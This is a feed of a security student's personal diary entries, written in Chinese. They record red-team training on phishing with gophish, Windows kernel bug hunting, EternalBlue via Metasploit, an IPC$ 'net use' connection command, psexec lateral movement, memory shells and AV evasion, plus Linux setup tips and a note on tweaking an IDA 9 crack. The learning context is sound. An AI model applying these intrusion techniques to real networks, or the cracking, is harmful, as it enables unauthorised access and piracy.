    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://mlm.lingyiwanwu.com/&quot;&gt;机器语言大模型MLM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来自高傲的清华&lt;/p&gt;
</summary>
      
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-23</title>
    <link href="https://c-lby.top/2024/08/23/diary/24-8-23/"/>
    <id>https://c-lby.top/2024/08/23/diary/24-8-23/</id>
    <published>2024-08-23T11:28:37.000Z</published>
    <updated>2024-08-23T11:56:21.017Z</updated>
    
    <content type="html"><![CDATA[<p>今天把终端搞了一下，忽然发现其实自己不是很喜欢zsh那种花里胡哨的风格，也许会在wsl上装（短时间内其实也不是很想），但是虚拟机或者未来装纯净ubuntu的时候不是很想装zsh这种，如果只是光改颜色的话其实也还行，但是并没有目色到合适的，还是用回原生吧，只是把终端背景的透明度改了一改能看到背景了而已，这样子就已经和舒服了。</p><p>可能老了，不喜欢太花里胡哨的东西了（</p><p>今天学了钓鱼的技术，其实总结一下就是gophish的使用，不过这个东西能部署在服务器上，集成一个总的邮件服务器，比settools方便，不过目前可能还是社工钓鱼用得比较多，很少邮件钓鱼了，除非需要大规模测试的，所以也就是学个过程体验个流程，不过确实学到了和学校课程不一样的地方，更多的实际案例和实操其实更能加深我对某个概念事务的印象。</p><p>今天似乎过得异常地轻松，比起前几天高强度的学习和考核。总算可以休息一会了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天把终端搞了一下，忽然发现其实自己不是很喜欢zsh那种花里胡哨的风格，也许会在wsl上装（短时间内其实也不是很想），但是虚拟机或者未来装纯净ubuntu的时候不是很想装zsh这种，如果只是光改颜色的话其实也还行，但是并没有目色到合适的，还是用回原生吧，只是把终端背景的透明度改了一改能看到背景了而已，这样子就已经和舒服了。&lt;/p&gt;
&lt;p&gt;可能老了，不喜欢太花里胡哨的东西了（&lt;/p&gt;
&lt;p&gt;今天学了钓鱼的技术，其实总结一下就是gophish的使用，不过这个东西能部署在服务器上，集成一个总的邮件服务器，比settools方便，不过目前可能还是社工钓鱼用得比较多，很少邮件钓鱼了，除非需要大规模测试的，所以也就是学个过程体验个流程，不过确实学到了和学校课程不一样的地方，更多的实际案例和实操其实更能加深我对某个概念事务的印象。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-21</title>
    <link href="https://c-lby.top/2024/08/21/diary/24-8-21/"/>
    <id>https://c-lby.top/2024/08/21/diary/24-8-21/</id>
    <published>2024-08-21T04:00:36.000Z</published>
    <updated>2024-08-21T17:34:01.763Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/ghostyusheng/article/details/80321483">docker-ce解决官网无法连接的问题</a></p><p>docker换源之后记得要<code>systemctl daemon-reload</code> <code>systemctl restart docker.service</code>重启一下docker相关的服务。</p><p>关于ubuntu22美化的资料：</p><p><a href="https://blog.csdn.net/weixin_44348719/article/details/132521680">https://blog.csdn.net/weixin_44348719/article/details/132521680</a></p><p><a href="https://blog.csdn.net/2301_76911706/article/details/133000145">https://blog.csdn.net/2301_76911706/article/details/133000145</a></p><p><a href="https://blog.csdn.net/qq_44928822/article/details/129358224">https://blog.csdn.net/qq_44928822/article/details/129358224</a></p><p><a href="https://blog.51cto.com/zhangxueliang/5376229">https://blog.51cto.com/zhangxueliang/5376229</a></p><p><a href="https://www.gnome-look.org/browse/">https://www.gnome-look.org/browse/</a></p><p><a href="https://www.cnblogs.com/WHU-TD/p/14010786.html">https://www.cnblogs.com/WHU-TD/p/14010786.html</a></p><p>主界面配置得差不多了，很满意。接下来就是自定义terminal了，交给明天的我来处理吧！</p><p>大概给终端加个背景图片就差不多了，还有就是修改一下pwndbg的显示，依然用wsl里用的模板就行，和tmux一起真的是天作之合，可惜还不熟悉tmux的操作，还得多练。</p><p>gnome-tweaks是可以直接在终端输入后打开UI界面的。gnome的那些插件在安装之前一定要在火狐或者chrome上安装拓展。打开这个网站<code>https://extensions.gnome.org</code>之后就会提示你安装插件了。在火狐上安装插件之后，要手动在插件界面允许与本地gnome交互，不然插件是无效的。然后就可以开始安装拓展了。想要调拓展的设置，要在<code>installed extends</code>界面，就有设置可以调了。</p><p>哦对，本地还要安装<code>gnome-chrome-connector</code>这个软件包。22以前的的软件包名字和23开始名字不一样，但是官网有提示。</p><p>全场最佳，那个跟随鼠标的眼睛（</p><p>有时间还是详细写一篇博文记录一下吧。</p><p>shit忽然想起来时钟插件忘了装，一样明天再装好了。<a href="https://blog.csdn.net/2301_76911706/article/details/133000145">教程</a></p><p>如果可以，真的像买台笔记本专门装一个ubuntu来使用。一定很舒服</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/ghostyusheng/article/details/80321483&quot;&gt;docker-ce解决官网无法连接的问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;docker换源之后记得要&lt;code&gt;systemctl daemon-reload&lt;/code&gt; &lt;code&gt;systemctl restart docker.service&lt;/code&gt;重启一下docker相关的服务。&lt;/p&gt;
&lt;p&gt;关于ubuntu22美化的资料：&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-20</title>
    <link href="https://c-lby.top/2024/08/20/diary/24-8-20/"/>
    <id>https://c-lby.top/2024/08/20/diary/24-8-20/</id>
    <published>2024-08-20T05:27:52.000Z</published>
    <updated>2024-08-22T16:28:49.804Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/zhuminghui/p/16396100.html">bat命令的安装与使用（batcat）</a>支持语法高亮，相当于升级版的cat命令，可以自定义高亮主题。</p><p>linux kernel题目中的cpio文件是一种备份文件，解压流程如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c_lby@laptop:/core$ ls</span><br><span class="line">core.cpio</span><br><span class="line">c_lby@laptop:/core$ mv core.cpio core.cpio.gz</span><br><span class="line">c_lby@laptop:/core$ gunzip core.cpio.gz</span><br><span class="line">c_lby@laptop:/core$ cpio -idm &lt; core.cpio</span><br><span class="line">104379 blocks</span><br></pre></td></tr></table></figure><p>感觉今天唯一学会的就是如何使用宝塔搭建站点，虚拟机里搭建环境的话，一般域名就设置成虚拟机的内网IP就行。记得要设置默认页面。如果是MVC模式的框架，一般就一个像index.php这样的入口文件，就设置一个就行。然后数据库的设置，一定要设置好密码用户名和数据库名，一定要和站点配置对得上，不然会报错。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/zhuminghui/p/16396100.html&quot;&gt;bat命令的安装与使用（batcat）&lt;/a&gt;支持语法高亮，相当于升级版的cat命令，可以自定义高亮主题。&lt;/p&gt;
&lt;p&gt;linux kernel题目中的cpio文件是一种备份文件，解压流程如下：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ ls&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;core.cpio&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ mv core.cpio core.cpio.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ gunzip core.cpio.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ cpio -idm &amp;lt; core.cpio&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104379 blocks&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-19</title>
    <link href="https://c-lby.top/2024/08/19/diary/24-8-19/"/>
    <id>https://c-lby.top/2024/08/19/diary/24-8-19/</id>
    <published>2024-08-19T10:43:19.000Z</published>
    <updated>2024-08-20T05:23:39.316Z</updated>
    
    <content type="html"><![CDATA[<p>Windows内核漏洞挖掘，这下就是真正意义上的还没学会走就要学跑了。不过也学了个大概的思路。如果未来考虑走挖洞这条路，最好是平时多调试多复现一些老的漏洞，积累经验和手感。但是其实国内大多数二进制岗位都是应急响应比较多，像赛博昆仑这样的注重挖洞的公司是很少见的。</p><p><a href="https://xz.aliyun.com/t/6008?time__1311=n4+xnD0DgDc7mqCqGNnmexRm7balgbD#toc-1">cve的解析</a></p><p><a href="https://whereisk0shl.top/post/a-trick-the-story-of-cve-2024-26230">k0shl师傅的博客</a></p><p><a href="https://xiaodaozhi.com/exploit/122.html">https://xiaodaozhi.com/exploit/122.html</a></p><p><a href="https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2015-2546/README.md">https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2015-2546/README.md</a></p><p><a href="https://blog.csdn.net/pangshaohua/article/details/6592390#:~:text=%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95%EF%BC%9A%20%E2%80%9C%E6%88%91%E7%9A%84%E7%94%B5%E8%84%91%E2%80%9D%E5%B1%9E%E6%80%A7%E4%B8%AD%EF%BC%8C%E9%AB%98%E7%BA%A7%E8%AE%BE%E7%BD%AE%E9%87%8C%EF%BC%8C%20%E6%9C%89%E4%B8%AA%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%EF%BC%8C%20%E5%8F%98%E9%87%8F%E5%90%8D%EF%BC%9A_NT_SYMBOL_PATH,%E5%8F%98%E9%87%8F%E5%80%BC%EF%BC%9ASRV%2A%20%7B%24Path%7D%2Ahttp%3A%2F%2Fmsdl.microsoft.com%2Fdownload%2Fsymbols%2F%20%E5%B0%86%E2%80%9C%20%7B%24Path%7D%E2%80%9D%E6%9B%BF%E6%8D%A2%E4%B8%BA%E8%A6%81%E5%AD%98%E5%82%A8pdb%E7%AC%A6%E5%8F%B7%E8%A1%A8%E6%96%87%E4%BB%B6%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E6%AF%94%E5%A6%82%EF%BC%9AC%3APDB">windbg&#x2F;ida自动下载符号表的设置方法</a></p><p><a href="https://www.anquanke.com/post/id/84911">cve复现</a></p><p><a href="https://github.com/AabyssZG/Docker-TCP-Scan">曾哥的新工具</a></p><p><a href="https://www.4hou.com/posts/n7V5">驱动漏洞挖掘入门</a></p><p>可以说是第一次接触到域渗透，一点经验也没有。菜就多练。</p><p>永恒之蓝的使用是基于139和445端口的开放，且特定漏洞版本下才能使用。使用msf框架可以比较方便地对此进行检测盒利用。kali中使用msfconsole。</p><p>445端口是可以直接在cmd中用<code>net use \\ip\ipc$ password /user:username</code>连接的</p><p>如果有完整权限，可以用psexec工具并接管其cmd。这个工具是微软官方的，也可以用\impacket-examples-windows的。</p><p>linux用多了，Windows的命令不会用一点，平时都是用的gui界面，要多学习Windows命令才行</p><p>要开始学习Windows开发等知识了，不然到时候练PoC都看不懂。</p><p>顺便记录一下今天想到的新生赛出题思路。之前忘记是做什么题了，一道简单的ret2text，然而传参却是往后推了一个的，也就是从rdx开始传。所以可以给一个这样的思路：给一个pop rdx，给一个mov rdi,rdx的gadget，然后组合传参。或者能不能自己写一个简单的so库，so中实现一个自定义的system函数，传两个参数，用其他东西占用一个参数位置，让其他参数顺延（也可以用execve）。</p><p>另一个出题想法是给<code>pop r8``call r8</code>这样的gadget，配合固定地址的mmap写shellcode，但是要自己利用栈溢出来执行shellcode。诶等等但是这样岂不是可以把地址写到ret位置上？可以给传入的参数加上字符过滤就好了。比如0x114514这样的地址，一般来说是不合法的，那么就可以在检查字符串的时候提示，地址非法。检查的话，为了防止加偏移绕过，可以用白名单的方式，比如检查是否来自程序基址段或者libc地址段上。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows内核漏洞挖掘，这下就是真正意义上的还没学会走就要学跑了。不过也学了个大概的思路。如果未来考虑走挖洞这条路，最好是平时多调试多复现一些老的漏洞，积累经验和手感。但是其实国内大多数二进制岗位都是应急响应比较多，像赛博昆仑这样的注重挖洞的公司是很少见的。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/6008?time__1311=n4+xnD0DgDc7mqCqGNnmexRm7balgbD#toc-1&quot;&gt;cve的解析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://whereisk0shl.top/post/a-trick-the-story-of-cve-2024-26230&quot;&gt;k0shl师傅的博客&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-18</title>
    <link href="https://c-lby.top/2024/08/18/diary/24-8-18/"/>
    <id>https://c-lby.top/2024/08/18/diary/24-8-18/</id>
    <published>2024-08-17T16:29:16.000Z</published>
    <updated>2024-08-18T17:48:46.105Z</updated>
    
    <content type="html"><![CDATA[<p>今天学的内容，是路由器固件漏洞挖掘和杀软漏洞挖掘。没有讲到环境模拟和固件提取，专注于讲漏洞挖掘。学到很多东西。捋一下</p><ul><li>实战中，IDA逆向分析的入手点一般是字符串。像路由器和杀软这样的二进制程序，会产生大量的日志，写这些日志就会有很多字符串留存在程序当中，而且其实一般不会像CTF一样各种隐藏。所以可以把具体位置的日志信息当做注释来看，辅助分析。</li><li>有些攻击面，有些漏洞，其实要结合web的知识，尤其是逻辑漏洞。比如没有过滤字符导致的目录穿越、sql注入等等。不要只带着二进制漏洞的思想去看iot中的漏挖</li><li>一般路由器（包括其他IOT设备）最好是挖未授权，授权后的漏洞一般利用条件比较难。</li><li>不要和别人挤破头都去找大热门被挖烂了的攻击面，找些冷门的。</li><li>不要放过任何一个小洞，可能可以和其他洞组合成一个大洞。</li><li>有些路由器是可以ssh上去的（比如华硕）</li></ul><p>初次体验了一下fuzz，用winafl，虽然最后因为环境配置问题（主要还是那个RIO），没跑成功。RIO如果要在本地编译需要安装perl，现在安装这玩意真是鬼死麻烦，已下载安装包，<strong>未配置，有时间再跑一下</strong>。讲讲收获：</p><ul><li>如何在cpp中静、动态调用dll，封装想要调试的函数（或流程）。</li><li>fuzz一个封装了想要测试的接口的程序，比测试原本的程序更快更方便。</li><li>winafl的参数设置，<strong>后面专门写一篇博客分析一下</strong>，还有写多开主次线程的批处理文件方法。</li><li>对于二进制插桩有了更深一层的理解，但是感觉还远远不够。</li><li><a href="https://libuv-docs-chinese.readthedocs.io/zh/latest/api.html">libuv库</a></li></ul><p>同学来问关于wsl代理的问题，我也是该<strong>找时间研究一下</strong>了，自己使用起来也是有点麻烦的，包括git终端也是不走代理，很难受。关于<a href="https://blog.dejavu.moe/posts/cfw-tun/">tun</a>和<a href="https://clashforwindows.cc/tun-%E6%A8%A1%E5%BC%8F/">tun</a>。</p><p>VM的vmdk磁盘文件可以通过ovf加载整台虚拟机，如果遇到hash对不上的情况，删掉打包的时候带有的mf文件即可。</p>]]></content>
    
    
    <summary type="html">三项待办</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-17</title>
    <link href="https://c-lby.top/2024/08/17/diary/24-8-17/"/>
    <id>https://c-lby.top/2024/08/17/diary/24-8-17/</id>
    <published>2024-08-17T01:29:19.000Z</published>
    <updated>2024-08-17T19:59:55.952Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.yuque.com/hxfqg9">yichen师傅的知识库</a>，有IoT，硬件安全，智能合约，web等.</p><p>劳累的一天。今天学内网渗透，虽然因为不怎么感兴趣而听得很潦草（？），但是依然学到了很多东西。不得不承认，这个地方真的能学到东西，老师真的会告诉你要怎么实操，要找什么东西要怎么找。这两三天来大量高深知识涌入脑子，能不能吸收另当别论，至少确确实实是有用且能用的知识与技能。</p><p>大部分知识也都记在笔记里了，重要的是晚上的靶场模拟演练切切实实感受了一遍内网渗透，或者说后渗透的大致流程和一些操作技巧等等。但是因为没什么经验，所以打得很菜，实际能找到的flag只有两个……虽然跟着思路现学新工具和知识复现打出了4个flag，依然有一个没能找到。</p><p>学到的新知识或资源有</p><ul><li><a href="https://www.anquanke.com/post/id/225870">内存马</a></li><li>冰蝎的使用（很强大，可以扫描网络资产存活的主机和运行的服务，搭建隧道实现内网穿透等等）</li><li>cve-2021-26084（<a href="https://www.cnblogs.com/NoId/p/16573825.html">confluence</a>的一个rce）</li><li>PostgreSQL数据库（可以用navicat连接，也可以用linux下的psql工具）</li><li>开源工具ConfluenceMemshell，可以一键给confluence注入内存马（有漏洞的情况下）</li><li><a href="https://blog.csdn.net/qq_39583774/article/details/130947754">双重内网横穿</a>，其实今天的靶场中最后一步也有这个场景，但是没做出来，有待复现</li><li><a href="https://tq.jxsec.cn/cas/index">天穹靶场</a></li><li><a href="https://www.somd5.com/">somd5</a></li></ul><p>哦对，顺便把kernel basic和ret2usr学了，虽然还没自己复现，有时间再说吧。大概思路是明白了，果然，之前没看懂的的知识，过一段时间再看就能看懂了，虽然最本初的原理还没去研究，但是流程和做法大致理解了。</p><p>顺带一提，还要找时间看看IDA9的破解原理，看能不能把名字改一下。其实研究那个py脚本文件就好了吧我想。看了一眼，果不其然，试试能不能改生效。大功告成！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/hxfqg9&quot;&gt;yichen师傅的知识库&lt;/a&gt;，有IoT，硬件安全，智能合约，web等.&lt;/p&gt;
&lt;p&gt;劳累的一天。今天学内网渗透，虽然因为不怎么感兴趣而听得很潦草（？），但是依然学到了很多东西。不得不承认，这个地方真的能学到东西，老师真的会告诉你要怎么实操，要找什么东西要怎么找。这两三天来大量高深知识涌入脑子，能不能吸收另当别论，至少确确实实是有用且能用的知识与技能。&lt;/p&gt;
&lt;p&gt;大部分知识也都记在笔记里了，重要的是晚上的靶场模拟演练切切实实感受了一遍内网渗透，或者说后渗透的大致流程和一些操作技巧等等。但是因为没什么经验，所以打得很菜，实际能找到的flag只有两个……虽然跟着思路现学新工具和知识复现打出了4个flag，依然有一个没能找到。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-16</title>
    <link href="https://c-lby.top/2024/08/16/diary/24-8-16/"/>
    <id>https://c-lby.top/2024/08/16/diary/24-8-16/</id>
    <published>2024-08-15T17:15:52.000Z</published>
    <updated>2024-08-16T17:20:45.439Z</updated>
    
    <content type="html"><![CDATA[<p>其实现在是17号凌晨，不过有接触到新的东西所以还是记录一下。首先是今天培训讲的内容有关Windows免杀，还算是比较感兴趣。但是苦于基础知识不多，开发能力欠缺，学起来和实践起来还是有点痛苦的。如果以后要走免杀研究或者杀软对抗这条路的话，至少要学好cpp、go、rust之类的语言，同时还要学Windows api相关的东西。</p><p>第二是做了一道背包加密的题目，用LLL算法在sage进行解密，这部分知识有待进一步深入学习。<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/132109655">资料</a></p><p>第三是，很久没用过web伪协议的知识了，应该要回顾一下了。</p><p>第四是，我觉得可能当下比较重要的一点，应该要开始接触一点点linux kernel的内容了。<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x00-%E7%BB%AA%E8%AE%BA">资料是a3师傅的博客</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实现在是17号凌晨，不过有接触到新的东西所以还是记录一下。首先是今天培训讲的内容有关Windows免杀，还算是比较感兴趣。但是苦于基础知识不多，开发能力欠缺，学起来和实践起来还是有点痛苦的。如果以后要走免杀研究或者杀软对抗这条路的话，至少要学好cpp、go、rust之类的语言，同时还要学Windows api相关的东西。&lt;/p&gt;
&lt;p&gt;第二是做了一道背包加密的题目，用LLL算法在sage进行解密，这部分知识有待进一步深入学习。&lt;a href=&quot;https://blog.csdn.net/XiongSiqi_blog/article/details/132109655&quot;&gt;资料&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第三是，很久没用过web伪协议的知识了，应该要回顾一下了。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-14</title>
    <link href="https://c-lby.top/2024/08/14/diary/24-8-14/"/>
    <id>https://c-lby.top/2024/08/14/diary/24-8-14/</id>
    <published>2024-08-14T02:41:38.000Z</published>
    <updated>2024-08-14T15:50:59.173Z</updated>
    
    <content type="html"><![CDATA[<p>今天似乎什么也没学，来青马红客训练营这边报了个道，也是来到锦行科技的公司了。</p><p>VN的成员页做好了，因为头像托管在github上加载有点慢，所以汪队帮我传到oss上了<a href="https://vnteam.cn/members/%E3%80%82oss%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%E5%AF%B9%E8%B1%A1%E5%82%A8%E5%AD%98%E6%9C%8D%E5%8A%A1%E3%80%82%E6%9C%89%E6%97%B6%E9%97%B4%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%E3%80%82">https://vnteam.cn/members/。oss是什么？阿里云的对象储存服务。有时间了解一下。</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天似乎什么也没学，来青马红客训练营这边报了个道，也是来到锦行科技的公司了。&lt;/p&gt;
&lt;p&gt;VN的成员页做好了，因为头像托管在github上加载有点慢，所以汪队帮我传到oss上了&lt;a href=&quot;https://vnteam.cn/members/%E3%80%82oss%</summary>
      
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-13</title>
    <link href="https://c-lby.top/2024/08/13/diary/24-8-13/"/>
    <id>https://c-lby.top/2024/08/13/diary/24-8-13/</id>
    <published>2024-08-13T02:38:17.000Z</published>
    <updated>2024-08-14T16:15:24.772Z</updated>
    
    <content type="html"><![CDATA[<p>ak了moe的web，太久没做ctf的web题，有点手生了。很艰难地学习并大概理解了pop链要怎么做，感谢jjg的帮助。<a href="https://blog.csdn.net/qq_45927266/article/details/120380343">资料</a>。之前是一点都看不懂，现在感觉能理解什么意思了，也知道要怎么生成payload了。最好还是全面学习一下php比较好，pwn题也会用得到。</p><p>晚上忽然上新一道运维题，抢救一个误删了glibc的linux系统，每次环境只有一次机会，因为仅存一个shell，如果断连了就没有了。也是第一次知道ls、cp这些命令是依赖于glibc的。找到了<a href="https://tech.soraharu.com/archives/96/">资料</a>，之前一直看到busybox，但没有真正去了解他，现在大概知道是个什么东西了。在我看来就是适合塞进嵌入式的小体积静态编译二进制程序包，可以实现linux的命令之类的功能，很方便。之后有时间也要深入了解一下。</p><p>感觉自己linux学得也是半斤八两，还是系统学习一下运维知识比较好。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ak了moe的web，太久没做ctf的web题，有点手生了。很艰难地学习并大概理解了pop链要怎么做，感谢jjg的帮助。&lt;a href=&quot;https://blog.csdn.net/qq_45927266/article/details/120380343&quot;&gt;资料&lt;/a&gt;。之前是一点都看不懂，现在感觉能理解什么意思了，也知道要怎么生成payload了。最好还是全面学习一下php比较好，pwn题也会用得到。&lt;/p&gt;
&lt;p&gt;晚上忽然上新一道运维题，抢救一个误删了glibc的linux系统，每次环境只有一次机会，因为仅存一个shell，如果断连了就没有了。也是第一次知道ls、cp这些命令是依赖于glibc的。找到了&lt;a href=&quot;https://tech.soraharu.com/archives/96/&quot;&gt;资料&lt;/a&gt;，之前一直看到busybox，但没有真正去了解他，现在大概知道是个什么东西了。在我看来就是适合塞进嵌入式的小体积静态编译二进制程序包，可以实现linux的命令之类的功能，很方便。之后有时间也要深入了解一下。&lt;/p&gt;
&lt;p&gt;感觉自己linux学得也是半斤八两，还是系统学习一下运维知识比较好。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-12</title>
    <link href="https://c-lby.top/2024/08/12/diary/24-8-12/"/>
    <id>https://c-lby.top/2024/08/12/diary/24-8-12/</id>
    <published>2024-08-12T09:39:37.000Z</published>
    <updated>2024-08-12T09:40:44.121Z</updated>
    
    <content type="html"><![CDATA[<p>可算是把页面处理好了，但是页面读取文章只能从全部文章列表里筛选符合diary分类的文章出来显示。换句话来说，他会作为一篇post出现在其他页面，虽然可以用隐藏，但是写frontmatter比较麻烦，得想个办法才行。</p><p>换了个生成器，可以限定某个页面只显示特定tag的文章，完美解决。还有一点麻烦的是每次新建文章，都要手动整理文章到路径。如果用-p参数，则没法自动抓取front-matter模板，今日乏了，不改源码了。我记得好像有现成的插件可以自动分类文件夹的，明天在找找。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可算是把页面处理好了，但是页面读取文章只能从全部文章列表里筛选符合diary分类的文章出来显示。换句话来说，他会作为一篇post出现在其他页面，虽然可以用隐藏，但是写frontmatter比较麻烦，得想个办法才行。&lt;/p&gt;
&lt;p&gt;换了个生成器，可以限定某个页面只显示特定ta</summary>
      
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
</feed>
